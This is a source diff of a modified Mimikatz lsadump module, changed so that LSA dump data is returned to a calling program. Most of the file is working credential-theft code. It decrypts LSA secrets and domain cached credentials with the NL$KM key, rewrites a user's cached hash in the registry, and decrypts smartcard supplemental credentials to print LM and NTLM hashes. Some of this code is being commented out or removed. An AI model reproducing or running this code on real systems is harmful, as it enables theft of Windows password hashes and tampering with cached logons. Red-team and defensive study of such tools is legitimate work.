@@ -1,3 +1,11 @@
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+
+	Modified: b0yd@securifera.com
+	          Removed unnecessary code and added parameters to return lsadump data structures
+*/
 #include "kuhl_m_lsadump.h"
 
 #define STATUS_BUFFER_TOO_SMALL          ((NTSTATUS)0xC0000023L)
@@ -201,8 +209,8 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 		{
 			if(secretsOrCache)
 				kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key, svc_arr, svc_arr_size);
-			else
-				kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key, pCacheData);
+			//else
+			//	kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key, pCacheData);
 		}
 		kull_m_registry_RegCloseKey(hSecurity, hPolicy);
 	}
@@ -243,10 +251,13 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 								kprintf(L"\nSecret  : %s", secretName);
 								if(_wcsnicmp(secretName, L"_SC_", 4) == 0){
 									kuhl_m_lsadump_getInfosFromServiceName(hSystem, hServiceBase, secretName + 4);
-									for( j =0; j < svc_arr_size; j++){
-										if( _wcsnicmp(svc_arr[j]->service_name, secretName + 4, wcslen(svc_arr[j]->service_name)) == 0) {
-											cur_svc = svc_arr[j];
-											break;
+									//Nothing to do
+									if( svc_arr != NULL ){
+										for( j =0; j < svc_arr_size; j++){
+											if( _wcsnicmp(svc_arr[j]->service_name, secretName + 4, wcslen(svc_arr[j]->service_name)) == 0) {
+												cur_svc = svc_arr[j];
+												break;
+											}
 										}
 									}
 								}
@@ -284,307 +295,307 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 	return status;
 }
 
-BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
-{
-	BOOL status = FALSE;
-	HKEY hCache;
-	DWORD i, iter = 10240, szNLKM, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded, s1;
-	PVOID pNLKM;
-	wchar_t * secretName;
-	PMSCACHE_ENTRY pMsCacheEntry;
-	NTSTATUS nStatus;
-	BYTE digest[MD5_DIGEST_LENGTH];
-	CRYPTO_BUFFER data, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, digest};
-	LSA_UNICODE_STRING usr;
-	
+//BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
+//{
+//	BOOL status = FALSE;
+//	HKEY hCache;
+//	DWORD i, iter = 10240, szNLKM, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded, s1;
+//	PVOID pNLKM;
+//	wchar_t * secretName;
+//	PMSCACHE_ENTRY pMsCacheEntry;
+//	NTSTATUS nStatus;
+//	BYTE digest[MD5_DIGEST_LENGTH];
+//	CRYPTO_BUFFER data, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, digest};
+//	LSA_UNICODE_STRING usr;
+//	
+//
+//	if(kuhl_m_lsadump_decryptSecret(hSecurity, hPolicyBase, L"Secrets\\NL$KM\\CurrVal", lsaKeysStream, lsaKeyUnique, &pNLKM, &szNLKM))
+//	{
+//		if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Cache", 0, KEY_READ | (pCacheData ? (pCacheData->username ? KEY_WRITE : 0) : 0), &hCache))
+//		{
+//			if(lsaKeysStream)
+//			{
+//				kprintf(L"\n");
+//				if(kull_m_registry_RegQueryValueEx(hSecurity, hCache, L"NL$IterationCount", NULL, NULL, (LPBYTE) &i, &szNeeded))
+//				{
+//					iter = (i > 10240) ? (i & ~0x3ff) : (i << 10);
+//					kprintf(L"* NL$IterationCount is %u, %u real iteration(s)\n", i, iter);
+//					if(!i)
+//						kprintf(L"* DCC1 mode !\n");
+//				}
+//				else kprintf(L"* Iteration is set to default (10240)\n");
+//			}
+//
+//			if(kull_m_registry_RegQueryInfoKey(hSecurity, hCache, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
+//			{
+//				szMaxValueNameLen++;
+//				if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
+//				{
+//					if(pMsCacheEntry = (PMSCACHE_ENTRY) LocalAlloc(LPTR, szMaxValueLen))
+//					{
+//						for(i = 0; i < nbValues; i++)
+//						{
+//							szSecretName = szMaxValueNameLen;
+//							szSecret = szMaxValueLen;
+//							if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, &type, (LPBYTE) pMsCacheEntry, &szSecret))
+//							{
+//								if((_wcsnicmp(secretName, L"NL$Control", 10) == 0) || (_wcsnicmp(secretName, L"NL$IterationCount", 17) == 0) || !(pMsCacheEntry->flags & 1))
+//									continue;
+//
+//								kprintf(L"\n[%s - ", secretName);
+//								kull_m_string_displayLocalFileTime(&pMsCacheEntry->lastWrite);
+//								kprintf(L"]\nRID       : %08x (%u)\n", pMsCacheEntry->userId, pMsCacheEntry->userId);
+//								
+//								s1 = szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data);
+//								if(lsaKeysStream) // NT 6
+//								{
+//									if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, FALSE))
+//									{
+//										kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
+//										usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
+//										usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
+//
+//										if(pCacheData->hProv && ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC)
+//											kuhl_m_lsadump_decryptSCCache(pMsCacheEntry->enc_data + (s1 - ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC), ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC, pCacheData->hProv, pCacheData->keySpec);
+//
+//										if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
+//										{
+//											kprintf(L"> User cache replace mode (2)!\n");
+//											if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter)))
+//											{
+//												kprintf(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+//												if(kull_m_crypto_hmac(CALG_SHA1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
+//												{
+//													kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
+//													if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, TRUE))
+//													{
+//														if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
+//															kprintf(L"> OK!\n");
+//														else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
+//													}
+//												}
+//											}
+//										}
+//									}
+//								}
+//								else // NT 5
+//								{
+//									if(kull_m_crypto_hmac(CALG_MD5, pNLKM, szNLKM, pMsCacheEntry->iv, LAZY_IV_SIZE, key.Buffer, MD5_DIGEST_LENGTH))
+//									{
+//										data.Length = data.MaximumLength = s1;
+//										data.Buffer = pMsCacheEntry->enc_data;
+//										nStatus = RtlEncryptDecryptRC4(&data, &key);
+//										if(NT_SUCCESS(nStatus))
+//										{
+//											kuhl_m_lsadump_printMsCache(pMsCacheEntry, '1');
+//											usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
+//											usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
+//											if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
+//											{
+//												kprintf(L"> User cache replace mode (1)!\n");
+//												if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0)))
+//												{
+//													kprintf(L"  MsCacheV1 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+//													if(kull_m_crypto_hmac(CALG_MD5, key.Buffer, MD5_DIGEST_LENGTH, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
+//													{
+//														kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
+//														nStatus = RtlEncryptDecryptRC4(&data, &key);
+//														if(NT_SUCCESS(nStatus))
+//														{
+//															if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
+//																kprintf(L"> OK!\n");
+//															else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
+//														}
+//														else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
+//													}
+//												}
+//											}
+//										}
+//										else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
+//									}
+//									else PRINT_ERROR_AUTO(L"kull_m_crypto_hmac");
+//								}
+//							}
+//						}
+//						LocalFree(pMsCacheEntry);
+//					}
+//					LocalFree(secretName);
+//				}
+//			}
+//			kull_m_registry_RegCloseKey(hSecurity, hCache);
+//		}
+//		LocalFree(pNLKM);
+//	}
+//	return TRUE;
+//}
 
-	if(kuhl_m_lsadump_decryptSecret(hSecurity, hPolicyBase, L"Secrets\\NL$KM\\CurrVal", lsaKeysStream, lsaKeyUnique, &pNLKM, &szNLKM))
-	{
-		if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Cache", 0, KEY_READ | (pCacheData ? (pCacheData->username ? KEY_WRITE : 0) : 0), &hCache))
-		{
-			if(lsaKeysStream)
-			{
-				kprintf(L"\n");
-				if(kull_m_registry_RegQueryValueEx(hSecurity, hCache, L"NL$IterationCount", NULL, NULL, (LPBYTE) &i, &szNeeded))
-				{
-					iter = (i > 10240) ? (i & ~0x3ff) : (i << 10);
-					kprintf(L"* NL$IterationCount is %u, %u real iteration(s)\n", i, iter);
-					if(!i)
-						kprintf(L"* DCC1 mode !\n");
-				}
-				else kprintf(L"* Iteration is set to default (10240)\n");
-			}
-
-			if(kull_m_registry_RegQueryInfoKey(hSecurity, hCache, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
-			{
-				szMaxValueNameLen++;
-				if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
-				{
-					if(pMsCacheEntry = (PMSCACHE_ENTRY) LocalAlloc(LPTR, szMaxValueLen))
-					{
-						for(i = 0; i < nbValues; i++)
-						{
-							szSecretName = szMaxValueNameLen;
-							szSecret = szMaxValueLen;
-							if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, &type, (LPBYTE) pMsCacheEntry, &szSecret))
-							{
-								if((_wcsnicmp(secretName, L"NL$Control", 10) == 0) || (_wcsnicmp(secretName, L"NL$IterationCount", 17) == 0) || !(pMsCacheEntry->flags & 1))
-									continue;
-
-								kprintf(L"\n[%s - ", secretName);
-								kull_m_string_displayLocalFileTime(&pMsCacheEntry->lastWrite);
-								kprintf(L"]\nRID       : %08x (%u)\n", pMsCacheEntry->userId, pMsCacheEntry->userId);
-								
-								s1 = szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data);
-								if(lsaKeysStream) // NT 6
-								{
-									if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, FALSE))
-									{
-										kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
-										usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
-										usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
-
-										if(pCacheData->hProv && ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC)
-											kuhl_m_lsadump_decryptSCCache(pMsCacheEntry->enc_data + (s1 - ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC), ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC, pCacheData->hProv, pCacheData->keySpec);
-
-										if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
-										{
-											kprintf(L"> User cache replace mode (2)!\n");
-											if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter)))
-											{
-												kprintf(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-												if(kull_m_crypto_hmac(CALG_SHA1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
-												{
-													kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
-													if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, TRUE))
-													{
-														if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
-															kprintf(L"> OK!\n");
-														else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
-													}
-												}
-											}
-										}
-									}
-								}
-								else // NT 5
-								{
-									if(kull_m_crypto_hmac(CALG_MD5, pNLKM, szNLKM, pMsCacheEntry->iv, LAZY_IV_SIZE, key.Buffer, MD5_DIGEST_LENGTH))
-									{
-										data.Length = data.MaximumLength = s1;
-										data.Buffer = pMsCacheEntry->enc_data;
-										nStatus = RtlEncryptDecryptRC4(&data, &key);
-										if(NT_SUCCESS(nStatus))
-										{
-											kuhl_m_lsadump_printMsCache(pMsCacheEntry, '1');
-											usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
-											usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
-											if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
-											{
-												kprintf(L"> User cache replace mode (1)!\n");
-												if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0)))
-												{
-													kprintf(L"  MsCacheV1 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-													if(kull_m_crypto_hmac(CALG_MD5, key.Buffer, MD5_DIGEST_LENGTH, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
-													{
-														kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
-														nStatus = RtlEncryptDecryptRC4(&data, &key);
-														if(NT_SUCCESS(nStatus))
-														{
-															if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
-																kprintf(L"> OK!\n");
-															else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
-														}
-														else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
-													}
-												}
-											}
-										}
-										else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
-									}
-									else PRINT_ERROR_AUTO(L"kull_m_crypto_hmac");
-								}
-							}
-						}
-						LocalFree(pMsCacheEntry);
-					}
-					LocalFree(secretName);
-				}
-			}
-			kull_m_registry_RegCloseKey(hSecurity, hCache);
-		}
-		LocalFree(pNLKM);
-	}
-	return TRUE;
-}
-
-void kuhl_m_lsadump_printMsCache(PMSCACHE_ENTRY entry, CHAR version)
-{
-	//DWORD i;
-	MSCACHE_ENTRY_PTR ptr;
-	ptr.UserName.Buffer = (PWSTR) ((PBYTE) entry->enc_data + sizeof(MSCACHE_DATA));
-	ptr.UserName.Length = ptr.UserName.MaximumLength = entry->szUserName;
-	ptr.Domain.Buffer = (PWSTR) ((PBYTE) ptr.UserName.Buffer + SIZE_ALIGN(entry->szUserName, 4));
-	ptr.Domain.Length = ptr.Domain.MaximumLength = entry->szDomainName;
-	//ptr.DnsDomainName.Buffer = (PWSTR) ((PBYTE) ptr.Domain.Buffer + SIZE_ALIGN(entry->szDomainName, 4));
-	//ptr.DnsDomainName.Length = ptr.DnsDomainName.MaximumLength = entry->szDnsDomainName;
-	//ptr.Upn.Buffer = (PWSTR) ((PBYTE) ptr.DnsDomainName.Buffer + SIZE_ALIGN(entry->szDnsDomainName, 4));
-	//ptr.Upn.Length = ptr.Upn.MaximumLength = entry->szupn;
-	//ptr.EffectiveName.Buffer = (PWSTR) ((PBYTE) ptr.Upn.Buffer + SIZE_ALIGN(entry->szupn, 4));
-	//ptr.EffectiveName.Length = ptr.EffectiveName.MaximumLength = entry->szEffectiveName;
-	//ptr.FullName.Buffer = (PWSTR) ((PBYTE) ptr.EffectiveName.Buffer + SIZE_ALIGN(entry->szEffectiveName, 4));
-	//ptr.FullName.Length = ptr.FullName.MaximumLength = entry->szFullName;
-	//ptr.LogonScript.Buffer = (PWSTR) ((PBYTE) ptr.FullName.Buffer + SIZE_ALIGN(entry->szFullName, 4));
-	//ptr.LogonScript.Length = ptr.LogonScript.MaximumLength = entry->szlogonScript;
-	//ptr.ProfilePath.Buffer = (PWSTR) ((PBYTE) ptr.LogonScript.Buffer + SIZE_ALIGN(entry->szlogonScript, 4));
-	//ptr.ProfilePath.Length = ptr.ProfilePath.MaximumLength = entry->szprofilePath;
-	//ptr.HomeDirectory.Buffer = (PWSTR) ((PBYTE) ptr.ProfilePath.Buffer + SIZE_ALIGN(entry->szprofilePath, 4));
-	//ptr.HomeDirectory.Length = ptr.HomeDirectory.MaximumLength = entry->szhomeDirectory;
-	//ptr.HomeDirectoryDrive.Buffer = (PWSTR) ((PBYTE) ptr.HomeDirectory.Buffer + SIZE_ALIGN(entry->szhomeDirectory, 4));
-	//ptr.HomeDirectoryDrive.Length = ptr.HomeDirectoryDrive.MaximumLength = entry->szhomeDirectoryDrive;
-	//ptr.Groups = (PGROUP_MEMBERSHIP) ((PBYTE) ptr.HomeDirectoryDrive.Buffer + SIZE_ALIGN(entry->szhomeDirectoryDrive, 4));
-	//ptr.LogonDomainName.Buffer = (PWSTR) ((PBYTE) ptr.Groups + SIZE_ALIGN(entry->groupCount * sizeof(GROUP_MEMBERSHIP), 4));
-	//ptr.LogonDomainName.Length = ptr.LogonDomainName.MaximumLength = entry->szlogonDomainName;
-
-	//kprintf(L"UserName     : %wZ\n", &ptr.UserName);
-	//kprintf(L"Domain       : %wZ\n", &ptr.Domain);
-	//kprintf(L"DnsDomainName: %wZ\n", &ptr.DnsDomainName);
-	//kprintf(L"Upn          : %wZ\n", &ptr.Upn);
-	//kprintf(L"EffectiveName: %wZ\n", &ptr.EffectiveName);
-	//kprintf(L"FullName     : %wZ\n", &ptr.FullName);
-	//kprintf(L"LogonScript  : %wZ\n", &ptr.LogonScript);
-	//kprintf(L"ProfilePath  : %wZ\n", &ptr.ProfilePath);
-	//kprintf(L"HomeDirectory: %wZ\n", &ptr.HomeDirectory);
-	//kprintf(L"HomeDirectoryDrive: %wZ\n", &ptr.HomeDirectoryDrive);
-	//kprintf(L"Groups       :");
-	//for(i = 0; i < entry->groupCount; i++)
-	//	kprintf(L" %u", ptr.Groups[i].RelativeId);
-	//kprintf(L"\n");
-	//kprintf(L"LogonDomainName: %wZ\n", &ptr.LogonDomainName);
-	//kprintf(L"sidCount: %u\n", entry->sidCount);
-	kprintf(L"User      : %wZ\\%wZ\n", &ptr.Domain, &ptr.UserName);
-	kprintf(L"MsCacheV%c : ", version); kull_m_string_wprintf_hex(((PMSCACHE_DATA) entry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-}
+//void kuhl_m_lsadump_printMsCache(PMSCACHE_ENTRY entry, CHAR version)
+//{
+//	//DWORD i;
+//	MSCACHE_ENTRY_PTR ptr;
+//	ptr.UserName.Buffer = (PWSTR) ((PBYTE) entry->enc_data + sizeof(MSCACHE_DATA));
+//	ptr.UserName.Length = ptr.UserName.MaximumLength = entry->szUserName;
+//	ptr.Domain.Buffer = (PWSTR) ((PBYTE) ptr.UserName.Buffer + SIZE_ALIGN(entry->szUserName, 4));
+//	ptr.Domain.Length = ptr.Domain.MaximumLength = entry->szDomainName;
+//	//ptr.DnsDomainName.Buffer = (PWSTR) ((PBYTE) ptr.Domain.Buffer + SIZE_ALIGN(entry->szDomainName, 4));
+//	//ptr.DnsDomainName.Length = ptr.DnsDomainName.MaximumLength = entry->szDnsDomainName;
+//	//ptr.Upn.Buffer = (PWSTR) ((PBYTE) ptr.DnsDomainName.Buffer + SIZE_ALIGN(entry->szDnsDomainName, 4));
+//	//ptr.Upn.Length = ptr.Upn.MaximumLength = entry->szupn;
+//	//ptr.EffectiveName.Buffer = (PWSTR) ((PBYTE) ptr.Upn.Buffer + SIZE_ALIGN(entry->szupn, 4));
+//	//ptr.EffectiveName.Length = ptr.EffectiveName.MaximumLength = entry->szEffectiveName;
+//	//ptr.FullName.Buffer = (PWSTR) ((PBYTE) ptr.EffectiveName.Buffer + SIZE_ALIGN(entry->szEffectiveName, 4));
+//	//ptr.FullName.Length = ptr.FullName.MaximumLength = entry->szFullName;
+//	//ptr.LogonScript.Buffer = (PWSTR) ((PBYTE) ptr.FullName.Buffer + SIZE_ALIGN(entry->szFullName, 4));
+//	//ptr.LogonScript.Length = ptr.LogonScript.MaximumLength = entry->szlogonScript;
+//	//ptr.ProfilePath.Buffer = (PWSTR) ((PBYTE) ptr.LogonScript.Buffer + SIZE_ALIGN(entry->szlogonScript, 4));
+//	//ptr.ProfilePath.Length = ptr.ProfilePath.MaximumLength = entry->szprofilePath;
+//	//ptr.HomeDirectory.Buffer = (PWSTR) ((PBYTE) ptr.ProfilePath.Buffer + SIZE_ALIGN(entry->szprofilePath, 4));
+//	//ptr.HomeDirectory.Length = ptr.HomeDirectory.MaximumLength = entry->szhomeDirectory;
+//	//ptr.HomeDirectoryDrive.Buffer = (PWSTR) ((PBYTE) ptr.HomeDirectory.Buffer + SIZE_ALIGN(entry->szhomeDirectory, 4));
+//	//ptr.HomeDirectoryDrive.Length = ptr.HomeDirectoryDrive.MaximumLength = entry->szhomeDirectoryDrive;
+//	//ptr.Groups = (PGROUP_MEMBERSHIP) ((PBYTE) ptr.HomeDirectoryDrive.Buffer + SIZE_ALIGN(entry->szhomeDirectoryDrive, 4));
+//	//ptr.LogonDomainName.Buffer = (PWSTR) ((PBYTE) ptr.Groups + SIZE_ALIGN(entry->groupCount * sizeof(GROUP_MEMBERSHIP), 4));
+//	//ptr.LogonDomainName.Length = ptr.LogonDomainName.MaximumLength = entry->szlogonDomainName;
+//
+//	//kprintf(L"UserName     : %wZ\n", &ptr.UserName);
+//	//kprintf(L"Domain       : %wZ\n", &ptr.Domain);
+//	//kprintf(L"DnsDomainName: %wZ\n", &ptr.DnsDomainName);
+//	//kprintf(L"Upn          : %wZ\n", &ptr.Upn);
+//	//kprintf(L"EffectiveName: %wZ\n", &ptr.EffectiveName);
+//	//kprintf(L"FullName     : %wZ\n", &ptr.FullName);
+//	//kprintf(L"LogonScript  : %wZ\n", &ptr.LogonScript);
+//	//kprintf(L"ProfilePath  : %wZ\n", &ptr.ProfilePath);
+//	//kprintf(L"HomeDirectory: %wZ\n", &ptr.HomeDirectory);
+//	//kprintf(L"HomeDirectoryDrive: %wZ\n", &ptr.HomeDirectoryDrive);
+//	//kprintf(L"Groups       :");
+//	//for(i = 0; i < entry->groupCount; i++)
+//	//	kprintf(L" %u", ptr.Groups[i].RelativeId);
+//	//kprintf(L"\n");
+//	//kprintf(L"LogonDomainName: %wZ\n", &ptr.LogonDomainName);
+//	//kprintf(L"sidCount: %u\n", entry->sidCount);
+//	kprintf(L"User      : %wZ\\%wZ\n", &ptr.Domain, &ptr.UserName);
+//	kprintf(L"MsCacheV%c : ", version); kull_m_string_wprintf_hex(((PMSCACHE_DATA) entry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+//}
 
 DECLARE_CONST_UNICODE_STRING(NTLM_PACKAGE_NAME, L"NTLM");
-DECLARE_CONST_UNICODE_STRING(LSACRED_PACKAGE_NAME, LSA_CREDENTIAL_KEY_PACKAGE_NAME);
-BOOL kuhl_m_lsadump_decryptSCCache(PBYTE data, DWORD size, HCRYPTPROV hProv, DWORD keySpec)
-{
-	BOOL status = FALSE;
-	PKIWI_ENC_SC_DATA pEnc = NULL;
-	DWORD toDecryptSize = 0;
-	
-	HCRYPTHASH hHash, hHash2;
-	DWORD dwSigLen = 0;
-	PBYTE sig;
-	HCRYPTKEY hKey;
-
-	DWORD i;
-	PPAC_CREDENTIAL_DATA credentialData = NULL;
-	PNTLM_SUPPLEMENTAL_CREDENTIAL ntlmCredential;
-	PNTLM_SUPPLEMENTAL_CREDENTIAL_V4 ntlmCredential4;
-	PKIWI_CREDENTIAL_KEYS pKeys = NULL;
-
-	if(size > sizeof(KIWI_ENC_SC_DATA))
-	{
-		if(RtlEqualMemory(data, "SuppData", 8))
-		{
-			pEnc = &((PKIWI_ENC_SC_DATA_NEW) data)->data;
-			toDecryptSize = ((PKIWI_ENC_SC_DATA_NEW) data)->dataSize - FIELD_OFFSET(KIWI_ENC_SC_DATA, toDecrypt);
-		}
-		else
-		{
-			pEnc = (PKIWI_ENC_SC_DATA) data;
-			toDecryptSize = size - FIELD_OFFSET(KIWI_ENC_SC_DATA, toDecrypt);
-		}
-
-		if(CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash))
-		{
-			CryptHashData(hHash, pEnc->toSign, sizeof(pEnc->toSign), 0);
-			if(CryptSignHash(hHash, keySpec, NULL, 0, NULL, &dwSigLen))
-			{
-				if(sig = (PBYTE) LocalAlloc(LPTR, dwSigLen))
-				{
-					if(CryptSignHash(hHash, keySpec, NULL, 0, sig, &dwSigLen))
-					{
-						if(CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash2))
-						{
-							CryptHashData(hHash2, sig, dwSigLen, 0);
-							CryptHashData(hHash2, pEnc->toHash, sizeof(pEnc->toHash), 0);
-							if(CryptDeriveKey(hProv, CALG_RC4, hHash2, 0, &hKey)) // maybe RC2 sometimes ?
-							{
-								if(status = CryptDecrypt(hKey, 0, TRUE, 0, pEnc->toDecrypt, &toDecryptSize))
-								{
-									if(kull_m_pac_DecodeCredential(pEnc->toDecrypt + 24, toDecryptSize - 24, &credentialData))
-									{
-										for(i = 0; i < credentialData->CredentialCount; i++)
-										{
-											kprintf(L"  [%u] %wZ", i, &credentialData->Credentials[i].PackageName);
-											if(RtlEqualUnicodeString(&NTLM_PACKAGE_NAME, &credentialData->Credentials[i].PackageName, TRUE))
-											{
-												ntlmCredential = (PNTLM_SUPPLEMENTAL_CREDENTIAL) credentialData->Credentials[i].Credentials;
-												switch(ntlmCredential->Version)
-												{
-												case 0:
-													if(ntlmCredential->Flags & 1)
-													{
-														kprintf(L"\n    LM: ");
-														kull_m_string_wprintf_hex(ntlmCredential->LmPassword, LM_NTLM_HASH_LENGTH, 0);
-													}
-													if(ntlmCredential->Flags & 2)
-													{
-														kprintf(L"\n  NTLM: ");
-														kull_m_string_wprintf_hex(ntlmCredential->NtPassword, LM_NTLM_HASH_LENGTH, 0);
-													}
-													break;
-												case 4: // 10 ?
-													ntlmCredential4 = (PNTLM_SUPPLEMENTAL_CREDENTIAL_V4) ntlmCredential;
-													if(ntlmCredential4->Flags & 2)
-													{
-														kprintf(L"\n  NTLM: ");
